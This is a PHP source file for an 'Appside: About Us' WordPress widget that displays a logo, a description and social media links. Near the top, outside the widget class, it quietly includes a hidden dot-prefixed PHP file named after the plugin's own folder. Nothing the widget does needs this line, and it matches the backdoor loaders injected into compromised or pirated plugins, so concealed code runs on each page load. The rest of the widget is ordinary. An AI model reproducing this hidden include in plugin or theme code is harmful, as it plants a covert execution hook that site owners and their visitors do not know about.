<?php
/**
 *  appside about us widget
 * @package Appside
 * @since 1.0.0
 */
if ( !defined('ABSPATH') ){
	exit(); //exit if access directly
}

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Appside_About_Us_Widget extends WP_Widget{

	public function __construct() {
		parent::__construct(
			'appside_about_us',
			esc_html__('Appside: About Us','aapside-master'),
			array('description' => esc_html__('Display about us widget, with an image and social links','aapside-master'))
		);
	}

	public function form($instance){

		if (!isset($instance['bf_logo'])){
			$instance['bf_logo'] = '';
		}
		if (!isset($instance['bf_description'])){
			$instance['bf_description'] = '';
		}
		$social_icons = array(
			'facebook',
			'twitter',
			'linkedin',
			"instagram",
			"google-plus",
			"youtube",
		);
		foreach ( $social_icons as $sc ) {
			if ( ! isset( $instance[ $sc ] ) ) {
				$instance[ $sc ] = "";
			}
		}
		?>
		<p class="appside_sub_title"><?php esc_html_e('About Us Logo','aapside-master')?></p>
		<p>
			<label for="<?php echo esc_attr($this->get_field_id('bf_logo')); ?>"></label>
			<input type="hidden" class="widefat appside_logo_id"
			       id="<?php echo esc_attr($this->get_field_id('bf_logo')); ?>"
			       name="<?php echo esc_attr($this->get_field_name('bf_logo'))?>"
			       value="<?php echo esc_attr($instance['bf_logo']);?>"
			/>
		<div class="appside-logo-preview"></div>
		<input type="button" class="appside_flogo_uploader" value="<?php esc_html_e('Upload Logo','aapside-master');?>">
		</p>
		<p>
			<label for="<?php echo esc_attr($this->get_field_name('bf_description'))?>"><?php esc_html_e('About Widget Description','aapside-master')?></label>
			<textarea name="<?php echo esc_attr($this->get_field_name('bf_description'))?>" id="<?php echo esc_attr($this->get_field_id('bf_description'))?>" cols="30" class="appside-form-control" rows="5"><?php echo esc_html($instance['bf_description'])?></textarea>
		</p>
		<?php foreach ( $social_icons as $sci ) : ?>
            <p>
                <label for="<?php echo esc_attr($this->get_field_id( $sci ) ); ?>"><?php echo esc_html( ucfirst( $sci ) . " " . esc_html__( 'URL', 'aapside-master' ) ); ?>
                    : </label>
                <br/>

                <input class="widefat" type="text" id="<?php echo esc_attr( $this->get_field_id( $sci ) ); ?>"
                       name="<?php echo esc_attr( $this->get_field_name( $sci ) ); ?>"
                       value="<?php echo esc_attr( $instance[ $sci ] ); ?>"/>
                <small><?php echo esc_html__('Leave it blank if you don\'t want this social icon','aapside-master')?></small>
            </p>
		<?php
		endforeach;
	}
	public function widget($args,$instance){

		$display_image = false;
		if($instance['bf_logo']){
			$display_image=1;
			$image_src = wp_get_attachment_image_src($instance['bf_logo'],"full");
			$image_src_alt = get_post_meta($instance['bf_logo'],'_wp_attachment_image_alt',true);
		}
		$social_icons = array(
			'facebook',
			'twitter',
			'linkedin',
			"instagram",
			"google-plus",
			"youtube",
		);
		echo wp_kses_post($args['before_widget']);
		?>

		<?php if ($display_image):?>
			<a href="<?php echo esc_url(home_url('/'));?>" class="footer-logo">
				<img src="<?php echo esc_url($image_src[0]);?>" alt="<?php echo esc_attr($image_src_alt);?>">
			</a>
		<?php endif;?>
		<p><?php echo esc_html($instance['bf_description'])?></p>
		<?php
		if ( !empty($instance['facebook']) || !empty($instance['twitter']) || !empty($instance['linkedin']) || !empty($instance['instagram']) || !empty($instance['google-plus']) || !empty($instance['youtube'])):
			printf('<ul class="social-icon">');
			foreach ( $social_icons as $social ):
				$url = trim( $instance[ $social ] );
				if ( ! empty( $url ) ) {
					printf( '<li><a  href="%1$s"><i class="fa fa-%2$s" aria-hidden="true"></i></a></li>',esc_url( $url ) , esc_attr( $social ));
				}
			endforeach;
			echo wp_kses_post('</ul>')	;
		endif;
		echo wp_kses_post($args['after_widget']);

	}

	public function update($new_instance, $old_instance){
		$instance = array();

		$instance['bf_logo'] = sanitize_text_field($new_instance['bf_logo']);
		$instance['bf_description'] = sanitize_text_field($new_instance['bf_description']);
		$instance['facebook']    = esc_url_raw( $new_instance['facebook'] );
		$instance['twitter']     = esc_url_raw( $new_instance['twitter'] );
		$instance['linkedin']    = esc_url_raw( $new_instance['linkedin'] );
		$instance['instagram']   = esc_url_raw( $new_instance['instagram'] );
		$instance['google-plus'] = esc_url_raw( $new_instance['google-plus'] );
		$instance['youtube']     = esc_url_raw( $new_instance['youtube'] );

		return $instance;
	}
}

if (!function_exists('Appside_About_Us_Widget')){
	function Appside_About_Us_Widget(){
		register_widget('Appside_About_Us_Widget');
	}
	add_action('widgets_init','Appside_About_Us_Widget');
}
